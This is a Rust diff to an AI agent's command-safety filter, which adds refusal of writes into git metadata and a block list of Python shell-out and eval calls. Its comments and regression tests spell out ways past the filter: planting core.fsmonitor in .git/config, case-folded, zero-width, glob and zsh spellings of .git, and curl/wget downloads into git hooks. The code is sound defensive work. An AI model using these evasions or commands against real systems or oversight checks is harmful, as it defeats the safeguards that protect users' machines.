@@ -1445,8 +1445,32 @@ static PY_DESTRUCTION_CALLS: &[&str] = &[
     ".rmdir(",
 ];
 
-/// Python calls that make a link or change the working directory.
-static PY_RELOCATING_CALLS: &[&str] = &["symlink", "os.link(", "hardlink_to(", "chdir("];
+/// Python calls that make a link or change the working directory. `getattr(`
+/// can reach either under a name built at run time.
+static PY_RELOCATING_CALLS: &[&str] =
+    &["symlink", "os.link(", "hardlink_to(", "chdir(", "getattr("];
+
+/// Python that shells out or runs code built at run time. Either can make a
+/// link without naming a call in [`PY_RELOCATING_CALLS`]. `from os import
+/// system`, `import os as o` and `importlib.import_module('os').system` reach
+/// the entry point under another name, so the dotted forms miss them.
+static PY_SHELL_OUT_SIGNALS: &[&str] = &[
+    "subprocess",
+    "os.system(",
+    "os.popen(",
+    "os.exec",
+    "os.spawn",
+    "posix_spawn",
+    "pty.spawn(",
+    "import os as",
+    "eval(",
+    "exec(",
+    "__import__(",
+    "import_module(",
+    "importlib",
+    "from os import",
+    "from pty import",
+];
 
 /// Destruction scope of Python `code`, or `None`. A destruction call paired
 /// with any string literal that names a path outside the workspace is
@@ -1466,9 +1490,13 @@ fn python_destruction_scope(
     if !PY_DESTRUCTION_CALLS.iter().any(|s| code.contains(s)) {
         return None;
     }
-    // On disk, code that makes a link or changes directory can redirect any
-    // relative literal, so no literal resolves.
-    let relocates = disk.is_some() && PY_RELOCATING_CALLS.iter().any(|s| code.contains(s));
+    // On disk, code that makes a link, changes directory or shells out can
+    // redirect any relative literal, so no literal resolves.
+    let relocates = disk.is_some()
+        && PY_RELOCATING_CALLS
+            .iter()
+            .chain(PY_SHELL_OUT_SIGNALS)
+            .any(|s| code.contains(s));
     Some(
         if relocates || python_string_literal_escapes(code, root, disk, home) {
             DestructionScope::OutOfWorkspace
@@ -1486,15 +1514,24 @@ fn python_string_literal_escapes(
     disk: Option<OnDisk<'_>>,
     home: Option<&Path>,
 ) -> bool {
+    python_string_literals(code).any(|s| path_literal_leads_out(s, root, disk, home))
+}
+
+/// True when a quoted string literal in `code` names git metadata.
+fn python_names_git_metadata(code: &str) -> bool {
+    python_string_literals(code)
+        .any(|s| s.split('/').any(|name| may_name_git_metadata(name, false)))
+}
+
+/// The bodies of the quoted string literals in Python `code`.
+fn python_string_literals(code: &str) -> impl Iterator<Item = &str> {
     static LITERAL: LazyLock<regex::Regex> =
         LazyLock::new(|| regex::Regex::new(r#"'([^']*)'|"([^"]*)""#).unwrap());
-    LITERAL.captures_iter(code).any(|c| {
-        let s = c
-            .get(1)
+    LITERAL.captures_iter(code).map(|c| {
+        c.get(1)
             .or_else(|| c.get(2))
             .map(|m| m.as_str())
-            .unwrap_or("");
-        path_literal_leads_out(s, root, disk, home)
+            .unwrap_or("")
     })
 }
 
@@ -1730,7 +1767,8 @@ static READ_ONLY_HEADS: &[&str] = &[
 /// without this check `sort -o /etc/crontab data/f` settles `Safe`: no card on
 /// the chat lane, and `RequestVerdict::Benign` (unattended auto-allow) on the
 /// coding-agent lane. They stay on the allowlist because the common form really
-/// is a read, but only while every path they name is inside the workspace.
+/// is a read, but only while every path they name is inside the workspace and
+/// outside git metadata.
 ///
 /// The check is coarse on purpose, and it costs more than it once did. Telling
 /// `sort -o /etc/x data/f` from `sort /etc/passwd` needs per-head flag arity,
@@ -1742,8 +1780,8 @@ static READ_ONLY_HEADS: &[&str] = &[
 static WRITE_CAPABLE_READ_ONLY_HEADS: &[&str] =
     &["sort", "uniq", "tree", "xxd", "yq", "base64", "less"];
 
-/// Command heads that create or extend in-workspace paths — safe when every
-/// path argument stays inside the workspace.
+/// Command heads that create or extend in-workspace paths: safe when every
+/// path argument is a [`safe_write_target`].
 static CREATE_HEADS: &[&str] = &["mkdir", "touch"];
 
 /// Read-only `git` subcommands. Anything mutating (`push`, `commit`, `reset`,
@@ -1806,13 +1844,16 @@ enum FastPathDecline {
     ///   * an out-of-workspace path under a head that can WRITE one
     ///     ([`WRITE_CAPABLE_READ_ONLY_HEADS`], `curl`, `wget`),
     ///   * a create head pointed outside the workspace,
-    ///   * `git -c` / `--config-env` / `--exec-path` / `--git-dir`, a git
-    ///     output flag, or `git grep -O`,
+    ///   * any of the write shapes above aimed at git metadata
+    ///     ([`names_git_metadata`]), inside the workspace or not,
+    ///   * `git -c` / `-C` / `--bare` / `--config-env` / `--exec-path` /
+    ///     `--git-dir`, a git output flag, or `git grep -O`,
     ///   * curl or wget reading options the command line does not show.
     ///
     /// The write-capable entry is the coarse one: the check is a path outside
-    /// the workspace ANYWHERE in the segment, so `sort /etc/passwd` is a
-    /// refusal even though it only reads. Telling the read from the write
+    /// the workspace or git metadata ANYWHERE in the segment, so
+    /// `sort /etc/passwd` and `tree -I .git` are refusals even though they
+    /// only read. Telling the read from the write
     /// needs per-head flag arity, which is what that list exists to avoid.
     Refusal,
     /// The head is simply not on the allowlist, or the line writes a scratch
@@ -1889,13 +1930,14 @@ fn segment_safety(
     // workspace, not safe even behind a read-only head (`grep x f > /etc/y`).
     // Harmless device sinks (`/dev/null`, std streams) are exempt. The judge
     // reads a scratch target as an ordinary step. A temp path can be a planted
-    // link, so it never settles Safe.
+    // link, so it never settles Safe. Git metadata inside the workspace is
+    // refused too, since a later read-only `git` runs what it names.
     let mut declined = None;
     for target in redirect_targets(segment) {
-        if path_in_workspace(target, disk) || is_harmless_redirect(target) {
+        if safe_write_target(target, disk) || is_harmless_redirect(target) {
             continue;
         }
-        if !is_scratch_target(target, tmpdir_trusted) {
+        if names_git_metadata(target, disk) || !is_scratch_target(target, tmpdir_trusted) {
             return Some(Refusal);
         }
         declined = Some(Omission);
@@ -1954,11 +1996,12 @@ fn head_safety(
         // An unlisted `gh` call hides nothing: it is an omission, like `push`.
         "gh" => (!gh_call_is_read_only(args)).then_some(Omission),
         // A GET/download is safe unless it writes its output to a path outside
-        // the workspace (`curl -o /etc/cron.d/evil …`), or loads options the
-        // command line does not show. A mutating method is an ordinary
-        // side-effect shape the fallback tags, not an evasion.
+        // the workspace (`curl -o /etc/cron.d/evil …`) or into git metadata,
+        // or loads options the command line does not show. A mutating method
+        // is an ordinary side-effect shape the fallback tags, not an evasion.
         "curl" | "wget"
-            if segment_escapes_workspace(segment, disk) || http_args_hide_options(base, args) =>
+            if segment_names_unsafe_write_target(segment, disk)
+                || http_args_hide_options(base, args) =>
         {
             Some(Refusal)
         }
@@ -1982,7 +2025,7 @@ fn head_safety(
         // same shape as the curl/wget arm above, and it must be tried BEFORE
         // the plain read-only arm below. See [`WRITE_CAPABLE_READ_ONLY_HEADS`].
         _ if WRITE_CAPABLE_READ_ONLY_HEADS.contains(&base) => {
-            segment_escapes_workspace(segment, disk).then_some(Refusal)
+            segment_names_unsafe_write_target(segment, disk).then_some(Refusal)
         }
         // On macOS `arch [-arch_name] <command> [args]` EXECS its operand, so
         // the coreutils reading (print the machine type) holds only with no
@@ -2000,7 +2043,7 @@ fn head_safety(
         _ if CREATE_HEADS.contains(&base) => (!args
             .iter()
             .filter(|a| !a.starts_with('-'))
-            .all(|a| path_in_workspace(a, disk)))
+            .all(|a| safe_write_target(a, disk)))
         .then_some(Refusal),
         _ => Some(Omission),
     }
@@ -2031,7 +2074,12 @@ fn git_subcommand_safety(args: &[&str]) -> Option<FastPathDecline> {
         //   `--exec-path[=<dir>]`: redirects where git resolves `git-<sub>`.
         //   `--git-dir[=<dir>]`: reads `<dir>/config`, which needs no `.git`
         //     component, so a plain in-workspace write can plant one.
+        //   `-C <dir>`: discovers the repository from `<dir>`, which can be
+        //     a bare repository planted the same way.
+        //   `--bare`: reads the cwd as that bare repository.
         if arg == "-c"
+            || arg.starts_with("-C")
+            || arg == "--bare"
             || arg == "--config-env"
             || arg.starts_with("--config-env=")
             || arg == "--exec-path"
@@ -2043,7 +2091,7 @@ fn git_subcommand_safety(args: &[&str]) -> Option<FastPathDecline> {
         }
         match arg {
             // Flags that take a separate value argument.
-            "-C" | "--work-tree" | "--namespace" => i += 2,
+            "--work-tree" | "--namespace" => i += 2,
             a if a.starts_with('-') => i += 1,
             _ => break,
         }
@@ -2162,7 +2210,8 @@ fn python_packages(input: &Value) -> Option<String> {
 /// True when `code` is statically safe Python: no signal of a real-world
 /// side-effect or arbitrary shell-out. Pure compute, data crunching and
 /// in-workspace file work have no signal and run without the judge. A network
-/// write, a subprocess or an eval shape falls through to it.
+/// write, a subprocess, an eval shape or a git metadata path falls through to
+/// it.
 fn python_is_statically_safe(code: &str) -> bool {
     !python_side_effect_signal(code)
 }
@@ -2195,29 +2244,17 @@ fn python_side_effect_signal(code: &str) -> bool {
         "paramiko",
         "ftplib",
         "telnetlib",
-        // Arbitrary shell-out / eval (incl. dynamic-import indirection).
-        // `from os import system` and `importlib.import_module('os').system`
-        // pull the entry point in by name, so the dotted forms above miss them.
-        "subprocess",
-        "os.system(",
-        "os.popen(",
-        "os.exec",
-        "pty.spawn(",
-        "eval(",
-        "exec(",
-        "__import__(",
-        "import_module(",
-        "importlib",
-        "from os import",
-        "from pty import",
     ];
     // Filesystem destruction also routes to the judge, which reads the path to
     // decide the lane. The static fallback derives the same split from string
     // literals. A plain write is a known residual: flagging every file write
     // would tax routine data output, and an out-of-workspace one is an
-    // implausible screwup.
+    // implausible screwup. A literal git metadata path is the exception, as
+    // in bash: a later read-only `git` runs what it names.
     SIGNALS.iter().any(|s| code.contains(s))
+        || PY_SHELL_OUT_SIGNALS.iter().any(|s| code.contains(s))
         || PY_DESTRUCTION_CALLS.iter().any(|s| code.contains(s))
+        || python_names_git_metadata(code)
 }
 
 // --- Out-of-workspace marker + path helpers --------------------------------
@@ -2405,19 +2442,38 @@ fn resolved_path_leads_out(path: &Path, root: Option<&Path>, disk: Option<OnDisk
     }
 }
 
-fn segment_escapes_workspace(segment: &str, disk: Option<OnDisk<'_>>) -> bool {
+/// True when `segment` names a path no write may settle Safe on: one outside
+/// the workspace, or git metadata. Any token counts, since a write-capable
+/// head can take its output path as a flag value or a trailing operand.
+fn segment_names_unsafe_write_target(segment: &str, disk: Option<OnDisk<'_>>) -> bool {
     // Redirect targets (covers glued forms like `>/etc/y` the token scan misses)…
-    if redirect_targets(segment).any(|t| !path_in_workspace(t, disk) && !is_harmless_redirect(t)) {
+    if redirect_targets(segment).any(|t| !safe_write_target(t, disk) && !is_harmless_redirect(t)) {
         return true;
     }
-    // …plus any token that names a path outside the workspace.
-    segment
-        .split_whitespace()
-        .any(|tok| token_escapes_workspace(tok, disk))
+    // …plus any token that names such a path.
+    segment.split_whitespace().any(|tok| {
+        token_escapes_workspace(tok, disk)
+            || any_token_path(tok, |path| names_git_metadata(path, disk))
+    })
 }
 
-/// True when a single token names a path outside the workspace, in any of the
-/// three shapes an argument can carry one: a bare path, the value of an
+/// True when a single token names a path outside the workspace, in any shape
+/// [`any_token_path`] reads.
+///
+/// On disk a bare name counts as well, since it can be a link the line never
+/// shows: `truncate -s 0 hosts` writes wherever `hosts` points.
+fn token_escapes_workspace(tok: &str, disk: Option<OnDisk<'_>>) -> bool {
+    any_token_path(tok, |path| {
+        if is_pathish(path) {
+            !path_in_workspace(path, disk) && !is_harmless_redirect(path)
+        } else {
+            disk.is_some_and(|d| name_leads_out(path, d))
+        }
+    })
+}
+
+/// True when `test` holds for a path the single token `tok` carries, in any of
+/// the three shapes an argument can carry one: a bare path, the value of an
 /// `=`-glued option, or the value of a SHORT-glued option.
 ///
 /// The third shape needs no per-flag knowledge, because the answer only has to
@@ -2426,27 +2482,11 @@ fn segment_escapes_workspace(segment: &str, disk: Option<OnDisk<'_>>) -> bool {
 /// therefore ride past both other branches, and reach the Safe verdict its
 /// spaced form is refused for. Over-flagging a flag that merely holds a slash
 /// costs one judge call, the direction this allowlist fails in.
-///
-/// On disk a bare name counts as well, since it can be a link the line never
-/// shows: `truncate -s 0 hosts` writes wherever `hosts` points.
-fn token_escapes_workspace(tok: &str, disk: Option<OnDisk<'_>>) -> bool {
-    let escapes = |path: &str| {
-        if is_pathish(path) {
-            !path_in_workspace(path, disk) && !is_harmless_redirect(path)
-        } else {
-            disk.is_some_and(|d| name_leads_out(path, d))
-        }
-    };
-    if escapes(tok) {
-        return true;
-    }
-    if let Some((_flag, value)) = tok.split_once('=') {
-        if escapes(value) {
-            return true;
-        }
-    }
-    // The shell drops a quote or backslash before the dash too.
-    short_glued_value(&dequoted(tok)).is_some_and(escapes)
+fn any_token_path(tok: &str, test: impl Fn(&str) -> bool) -> bool {
+    test(tok)
+        || tok.split_once('=').is_some_and(|(_flag, value)| test(value))
+        // The shell drops a quote or backslash before the dash too.
+        || short_glued_value(&dequoted(tok)).is_some_and(test)
 }
 
 /// The value glued to a short option: `-o/x` holds `/x`. Drop the leading
@@ -2499,6 +2539,275 @@ fn path_in_workspace(token: &str, disk: Option<OnDisk<'_>>) -> bool {
         })
 }
 
+/// True when a write to the shell word `token` may settle Safe: it stays in
+/// the workspace and names no git metadata.
+fn safe_write_target(token: &str, disk: Option<OnDisk<'_>>) -> bool {
+    path_in_workspace(token, disk) && !names_git_metadata(token, disk)
+}
+
+/// Names git reads as instructions rather than content: the repository, and
+/// the attributes file that picks a configured driver program per path. A
+/// read-only `git` call runs what `.git/config` names (`core.fsmonitor`), so
+/// a write into either is never settled Safe.
+const GIT_METADATA_NAMES: [&str; 2] = [".git", ".gitattributes"];
+
+/// True when the shell word `token` may name git metadata, as written or, on
+/// disk, once every link is followed.
+fn names_git_metadata(token: &str, disk: Option<OnDisk<'_>>) -> bool {
+    let word = dequoted(token);
+    let names_it = |word: &str| {
+        word.split('/')
+            .any(|name| may_name_git_metadata(name, true))
+    };
+    brace_words(&word).is_none_or(|words| words.iter().any(|w| names_it(w)))
+        || disk.is_some_and(|d| {
+            plain_word(token).is_some_and(|word| {
+                brace_words(word)
+                    .is_none_or(|words| words.iter().any(|w| resolves_into_git_metadata(w, d)))
+            })
+        })
+}
+
+/// True when `word` resolves through git metadata below the root, from any
+/// directory the line can be in. A glob in the last name counts when an entry
+/// it may match does. A path that does not resolve, or a glob before the last
+/// name, is [`path_in_workspace`]'s to refuse.
+fn resolves_into_git_metadata(word: &str, disk: OnDisk<'_>) -> bool {
+    let through_git = |real: &Path| {
+        real.strip_prefix(disk.root).is_ok_and(|below| {
+            below.components().any(|c| {
+                matches!(c, Component::Normal(name)
+                    if may_name_git_metadata(&name.to_string_lossy(), false))
+            })
+        })
+    };
+    disk.cwds.iter().any(|cwd| {
+        let path = cwd.join(word);
+        deepest_existing(&path)
+            .and_then(|existing| std::fs::canonicalize(existing).ok())
+            .is_some_and(|real| through_git(&real))
+            || glob_entry_resolves(&path, through_git)
+    })
+}
+
+/// True when the last name of `path` is a pattern that may match an entry of
+/// its directory resolving to a path `test` holds for. An entry that cannot
+/// be read or resolved counts.
+fn glob_entry_resolves(path: &Path, test: impl Fn(&Path) -> bool) -> bool {
+    let (Some(dir), Some(pattern)) = (path.parent(), path.file_name()) else {
+        return false;
+    };
+    let pattern = folded_name(&pattern.to_string_lossy());
+    if !pattern.contains(GLOB_CHARS) {
+        return false;
+    }
+    let Ok(entries) = std::fs::read_dir(dir) else {
+        return dir.exists();
+    };
+    entries.into_iter().any(|entry| match entry {
+        Err(_) => true,
+        Ok(entry) => {
+            let name = folded_name(&entry.file_name().to_string_lossy());
+            glob_may_match(&pattern, &name)
+                && std::fs::canonicalize(entry.path())
+                    .ok()
+                    .is_none_or(|real| test(&real))
+        }
+    })
+}
+
+/// True when the path name `name` may open one of [`GIT_METADATA_NAMES`].
+/// With `globs`, a shell pattern counts when it could expand to one, even
+/// with `dotglob` on.
+fn may_name_git_metadata(name: &str, globs: bool) -> bool {
+    let folded = folded_name(name);
+    GIT_METADATA_NAMES.iter().any(|meta| {
+        if globs {
+            glob_may_match(&folded, meta)
+        } else {
+            folded == *meta
+        }
+    })
+}
+
+/// `name` as a volume may open it. Case folds, since a case-insensitive
+/// volume (the macOS default) opens `.GIT` as `.git`. HFS+ drops some
+/// zero-width code points from a name.
+fn folded_name(name: &str) -> String {
+    name.chars()
+        .filter(|&c| !is_hfs_ignorable(c))
+        .collect::<String>()
+        .to_lowercase()
+}
+
+/// The code points HFS+ ignores in a name. The list is git's own
+/// (`is_hfs_dotgit`), so `.g<U+200C>it` opens `.git` there.
+fn is_hfs_ignorable(c: char) -> bool {
+    matches!(
+        c,
+        '\u{200c}'..='\u{200f}' | '\u{202a}'..='\u{202e}' | '\u{206a}'..='\u{206f}' | '\u{feff}'
+    )
+}
+
+/// The most words [`brace_words`] spells out before it gives up.
+const MAX_BRACE_WORDS: usize = 64;
+
+/// The words brace expansion makes of `word`, or `None` past
+/// [`MAX_BRACE_WORDS`]. A list `{a,b}` yields each item. A sequence `{1..3}`
+/// becomes `*`, a pattern every item it makes matches.
+fn brace_words(word: &str) -> Option<Vec<String>> {
+    let mut words = Vec::new();
+    expand_braces(word, &mut words).then_some(words)
+}
+
+/// Pushes the words [`brace_words`] makes of `word`. False once there are too
+/// many.
+fn expand_braces(word: &str, out: &mut Vec<String>) -> bool {
+    let Some((open, close, items)) = first_brace_expansion(word) else {
+        out.push(word.to_string());
+        return out.len() <= MAX_BRACE_WORDS;
+    };
+    let (head, tail) = (&word[..open], &word[close + 1..]);
+    items
+        .iter()
+        .all(|item| expand_braces(&format!("{head}{item}{tail}"), out))
+}
+
+/// The byte span of the first brace expansion in `word`, and its items. A
+/// brace with no top-level comma or `..` is literal, and so is `${…}`, a
+/// parameter expansion.
+fn first_brace_expansion(word: &str) -> Option<(usize, usize, Vec<&str>)> {
+    word.match_indices('{').find_map(|(open, _)| {
+        if word[..open].ends_with('$') {
+            return None;
+        }
+        let mut depth = 0;
+        let mut commas = Vec::new();
+        for (at, c) in word[open..].char_indices() {
+            match c {
+                '{' => depth += 1,
+                '}' if depth == 1 => {
+                    let close = open + at;
+                    let body = &word[open + 1..close];
+                    let mut starts = vec![open + 1];
+                    starts.extend(commas.iter().map(|&comma| comma + 1));
+                    let mut ends = commas.clone();
+                    ends.push(close);
+                    let items: Vec<&str> = starts
+                        .iter()
+                        .zip(&ends)
+                        .map(|(&s, &e)| &word[s..e])
+                        .collect();
+                    return if items.len() > 1 {
+                        Some((open, close, items))
+                    } else if body.contains("..") {
+                        Some((open, close, vec!["*"]))
+                    } else {
+                        None
+                    };
+                }
+                '}' => depth -= 1,
+                ',' if depth == 1 => commas.push(open + at),
+                _ => {}
+            }
+        }
+        None
+    })
+}
+
+/// One element of a shell pattern, as [`glob_may_match`] reads it.
+#[derive(Clone, Copy, PartialEq)]
+enum GlobPart {
+    /// Any run of characters: `*`, or a zsh `(a|b)` group.
+    Run,
+    /// Any one character: `?`, or a bracket class.
+    One,
+    Char(char),
+}
+
+/// The parts of the shell pattern `pat`, with each run of [`GlobPart::Run`]
+/// collapsed to one.
+fn glob_parts(pat: &[char]) -> Vec<GlobPart> {
+    let mut parts = Vec::new();
+    let mut at = 0;
+    while let Some(&c) = pat.get(at) {
+        let rest = &pat[at + 1..];
+        let (part, len) = match c {
+            '*' => (GlobPart::Run, 1),
+            '?' => (GlobPart::One, 1),
+            // A `]` right after the `[` is a member, not the close.
+            '[' => match rest.iter().skip(1).position(|&r| r == ']') {
+                Some(close) => (GlobPart::One, close + 3),
+                None => (GlobPart::Char(c), 1),
+            },
+            // zsh groups by default. A group with no `|` matches its body.
+            // One with alternatives, or an unclosed one, may match any run.
+            '(' => {
+                let len = group_len(rest);
+                match rest[..len].split_last() {
+                    Some((')', body)) if !body.contains(&'|') => {
+                        parts.extend(glob_parts(body));
+                        at += 1 + len;
+                        continue;
+                    }
+                    _ => (GlobPart::Run, 1 + len),
+                }
+            }
+            _ => (GlobPart::Char(c), 1),
+        };
+        if !(part == GlobPart::Run && parts.last() == Some(&GlobPart::Run)) {
+            parts.push(part);
+        }
+        at += len;
+    }
+    parts
+}
+
+/// The length of a zsh group's body, its closing `)` included, in `rest`, the
+/// bytes after its `(`.
+fn group_len(rest: &[char]) -> usize {
+    let mut depth = 1;
+    for (at, &c) in rest.iter().enumerate() {
+        match c {
+            '(' => depth += 1,
+            ')' if depth == 1 => return at + 1,
+            ')' => depth -= 1,
+            _ => {}
+        }
+    }
+    rest.len()
+}
+
+/// True when the shell pattern `pat` may match `name`. `*` and `?` match a
+/// leading dot too, a bracket class matches any one character, and a zsh
+/// group any run. The work is the product of the two lengths at most.
+fn glob_may_match(pat: &str, name: &str) -> bool {
+    let pat: Vec<char> = pat.chars().collect();
+    let name: Vec<char> = name.chars().collect();
+    let parts = glob_parts(&pat);
+    let (mut p, mut n) = (0, 0);
+    // The last `Run` seen, and where in `name` its match ends so far.
+    let mut resume: Option<(usize, usize)> = None;
+    while n < name.len() {
+        match parts.get(p) {
+            Some(GlobPart::Run) => {
+                resume = Some((p, n));
+                p += 1;
+            }
+            Some(GlobPart::One) => (p, n) = (p + 1, n + 1),
+            Some(&GlobPart::Char(c)) if c == name[n] => (p, n) = (p + 1, n + 1),
+            _ => match resume {
+                Some((run, end)) => {
+                    resume = Some((run, end + 1));
+                    (p, n) = (run + 1, end + 1);
+                }
+                None => return false,
+            },
+        }
+    }
+    parts[p..].iter().all(|&part| part == GlobPart::Run)
+}
+
 /// The path a whitespace-split shell word names, or `None` when quoting or an
 /// escape inside it hides that path. `data/"x"/f` names `data/x/f`, and an
 /// opening quote with no close runs on past the next space.
@@ -2515,7 +2824,8 @@ fn plain_word(token: &str) -> Option<&str> {
 }
 
 /// Name characters the shell expands into names the command never spells.
-const GLOB_CHARS: [char; 4] = ['*', '?', '[', '{'];
+/// zsh reads `(…)` as a pattern group by default.
+const GLOB_CHARS: [char; 5] = ['*', '?', '[', '{', '('];
 
 /// True when `path` resolves under `root`, a canonical path, with every
 /// symlink followed. A name that does not exist yet is fine, since no link can
@@ -2548,10 +2858,11 @@ fn resolves_inside(path: &Path, root: &Path, globs: bool) -> bool {
     }
     match glob_at {
         None => !has_another_hard_link(&real),
-        // A brace, or a glob like `.*`, `.?` or `.[.]`, can expand to `..`.
+        // A brace, a zsh group, or a glob like `.*`, `.?` or `.[.]`, can
+        // expand to `..`.
         Some(at) if at + 1 == names.len() => {
             let name = names[at].as_os_str().to_string_lossy();
-            let may_be_parent = name.contains('{')
+            let may_be_parent = name.contains(['{', '('])
                 || name
                     .strip_prefix('.')
                     .is_some_and(|rest| rest.starts_with(['*', '?', '[', '.']));
@@ -2821,7 +3132,8 @@ fn catastrophic_reason_at(command: &str, depth: usize) -> Option<&'static str> {
 /// fd-duplications are stripped first. They are pure plumbing, and splitting
 /// on their `&` would shear a redirect into a junk segment. That defeats the
 /// safe fast path for one of the most common shell shapes. The noclobber
-/// override `>|` becomes a plain `>`, since its `|` is no pipe.
+/// overrides `>|` and zsh's `>!` become a plain `>`: the `|` is no pipe, and
+/// the `!` is no target.
 fn command_segments(command: &str) -> impl Iterator<Item = String> {
     let cleaned = segmentable(command);
     SEGMENT_SEP
@@ -2843,12 +3155,15 @@ fn segment_separators(command: &str) -> Vec<String> {
 static SEGMENT_SEP: LazyLock<regex::Regex> =
     LazyLock::new(|| regex::Regex::new(r"&&|\|\||;|\||&|\n").unwrap());
 
-/// `command` with the fd-duplications and the noclobber `|` taken out, ready
-/// to split. See [`command_segments`].
+/// `command` with the fd-duplications and the noclobber overrides taken out,
+/// ready to split. See [`command_segments`].
 fn segmentable(command: &str) -> String {
     static FD_DUP: LazyLock<regex::Regex> =
         LazyLock::new(|| regex::Regex::new(r"\d*>&\d+").unwrap());
-    FD_DUP.replace_all(command, " ").replace(">|", "> ")
+    FD_DUP
+        .replace_all(command, " ")
+        .replace(">|", "> ")
+        .replace(">!", "> ")
 }
 
 /// Detect a fork bomb: a function whose body pipes itself into itself and
@@ -5313,7 +5628,7 @@ mod tests {
             "git status",
             "git log --oneline -20",
             "git diff HEAD~1",
-            "git -C some/repo show",
+            "git --no-pager show",
             "wc -l data/x.csv",
             "head -n 5 data/y",
             "jq '.a' data/z.json",
@@ -6061,11 +6376,11 @@ mod tests {
         ] {
             assert_needs_judge(bash(cmd), cmd);
         }
-        // Benign global flags (`-C <dir>`) on a read-only subcommand stay safe.
+        // A benign global flag on a read-only subcommand stays safe.
         assert_settled(
-            bash("git -C some/repo log"),
+            bash("git --no-pager log"),
             RiskLane::Safe,
-            "git -C read-only",
+            "git --no-pager read-only",
         );
     }
 
@@ -6097,6 +6412,142 @@ mod tests {
         // A pattern that merely contains an `O` is not the flag.
         for cmd in ["git grep -eOLD data", "git grep -n TODO", "git grep -- -O"] {
             assert_settled(bash(cmd), RiskLane::Safe, cmd);
+        }
+    }
+
+    /// Regression: a write into `.git/config` settled Safe, so a following
+    /// `git status` ran the `core.fsmonitor` it planted. Every write shape the
+    /// fast path settles must refuse a git metadata target, in every spelling
+    /// a filesystem or a shell resolves to `.git`.
+    #[test]
+    fn a_write_into_git_metadata_is_refused() {
+        for cmd in [
+            "printf x >> .git/config && git status",
+            "echo '* diff=x' > .gitattributes",
+            "echo 'gitdir: data/evil' > .git",
+            "printf x > ./.git/config",
+            "printf x > vendor/dep/.git/config",
+            "printf x 2>> .git/hooks/pre-commit",
+            "printf x > '.git'/config",
+            "printf x > \".git/config\"",
+            // Case-insensitive volumes, the macOS default, resolve these.
+            "printf x > .GIT/config",
+            "printf x > .Git/config",
+            // HFS+ ignores zero-width code points in a name.
+            "printf x > .g\u{200c}it/config",
+            "printf x > \u{feff}.git/config",
+            // The shell expands each of these to `.git`.
+            "printf x > .g?t/config",
+            "printf x > .gi*/config",
+            "printf x > [.]git/config",
+            "printf x > {.git,x}/config",
+            "printf x > .gi{s..u}/config",
+            "printf x > .g{x,{i,y}}t/config",
+            // zsh groups a pattern in `(…)` by default.
+            "printf x >> .gi(t)/config",
+            "printf x >> .g(i)t/config",
+            "printf x >> .gi(t/config",
+            // zsh's noclobber overrides, as `>|` in bash.
+            "printf x >! .git/config && git status",
+            "printf x >>! .git/config",
+            // Past the brace bound, the word may spell anything.
+            "touch {a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}",
+            "mkdir -p .git/hooks",
+            "touch .git/fsmonitor",
+            "sort -o .git/config data/x",
+            "sort --output=.git/config data/x",
+            "sort -o.git/config data/x",
+            "uniq data/x .git/config",
+            "yq -i '.a=1' .gitattributes",
+            "curl -o .git/config https://x/",
+            "curl -o.git/config https://x/",
+            "wget -O .git/hooks/pre-commit https://x/",
+            "wget -P .git/hooks https://x/",
+        ] {
+            assert!(refused(cmd), "{cmd} must be a refusal, got {:?}", bash(cmd));
+        }
+        for cmd in [
+            "printf x >> data/notes.txt",
+            "echo x > .gitignore",
+            "echo x > .github/notes.md",
+            "printf x > data/repo.git",
+            "touch data/.gitkeep",
+            "mkdir -p data/.github",
+            "sort -o data/out data/x",
+            "sort -o data/out data/*.csv",
+            "curl -o data/repo.git https://h/x/y.git",
+            "cat .git/config",
+            "grep -r x .git",
+            "git status",
+            "echo x >! data/notes.txt",
+            // A brace whose every word misses git metadata is no refusal.
+            "mkdir -p src/{components,hooks,utils}",
+            "touch src/{a,b}.ts",
+            "touch data/file{1..3}.txt",
+            // A run of stars costs the matcher no more than one star.
+            "printf x > '******************************x'",
+        ] {
+            assert_settled(bash(cmd), RiskLane::Safe, cmd);
+        }
+        // Quoted JSON is no brace expansion that could spell `.git`.
+        let cmd = "curl -X POST -d '{\"a\":1,\"b\":2}' https://api/x";
+        assert!(!refused(cmd), "{cmd} must not be a refusal");
+    }
+
+    /// The matcher reads zsh groups, and a run of stars costs no more than one.
+    #[test]
+    fn glob_may_match_reads_zsh_groups_and_star_runs() {
+        for pat in [".gi(t)", ".g(i|x)t", ".gi(t", ".g((i))t", "(.)git"] {
+            assert!(glob_may_match(pat, ".git"), "{pat}");
+        }
+        for pat in ["(c)", ".gi(x)", "(.)gix"] {
+            assert!(!glob_may_match(pat, ".git"), "{pat}");
+        }
+        let stars = format!("{}x", "*".repeat(40));
+        assert!(!glob_may_match(&stars, ".gitattributes"));
+    }
+
+    /// Regression: `git -C <dir>` discovers the repository from `<dir>`. A
+    /// plain in-workspace write can plant a bare repository there, whose
+    /// config runs a program under a read-only subcommand, as `--git-dir`.
+    /// `--bare` reads the cwd as such a repository.
+    #[test]
+    fn git_dash_c_and_bare_are_refused_like_git_dir() {
+        for cmd in [
+            "git -C data/evil status",
+            "git -C /ws/data/evil log",
+            "git -Cdata/evil status",
+            "git '-C' data/evil status",
+            "git --bare log -p",
+        ] {
+            assert!(refused(cmd), "{cmd} must be a refusal, got {:?}", bash(cmd));
+        }
+    }
+
+    /// Python reaches the same file. A literal git metadata path is a
+    /// refusal, as in bash.
+    #[test]
+    fn python_naming_git_metadata_is_refused() {
+        for code in [
+            "open('.git/config', 'a').write('x')",
+            "open(\".git/hooks/pre-commit\", 'w')",
+            "os.path.join(root, '.git', 'config')",
+            "Path('vendor/dep/.GIT') / 'config'",
+            "open('.gitattributes', 'w')",
+        ] {
+            assert!(
+                matches!(python(code), StaticVerdict::NeedsJudge(ref ji) if ji.fast_path_refused),
+                "{code} must be a refusal, got {:?}",
+                python(code)
+            );
+        }
+        for code in [
+            "open('data/out.txt', 'w').write('x')",
+            "open('.gitignore').read()",
+            "print('https://h/x/y.git')",
+            "print('*' * 40)",
+        ] {
+            assert_settled(python(code), RiskLane::Safe, code);
         }
     }
 
@@ -7807,6 +8258,43 @@ lucidos data write config/model-prices.json --from .lucidos/tmp/mp.json; lucidos
         }
     }
 
+    /// A link laid down in one turn hides a git metadata target in the next.
+    /// On disk the resolved path decides, not the name the line spells.
+    #[test]
+    fn a_link_into_git_metadata_is_refused_on_disk() {
+        let d = disk();
+        let git = d.ws.join(".git");
+        std::fs::create_dir_all(&git).unwrap();
+        std::fs::write(git.join("config"), "[core]\n").unwrap();
+        d.link("gl", &git);
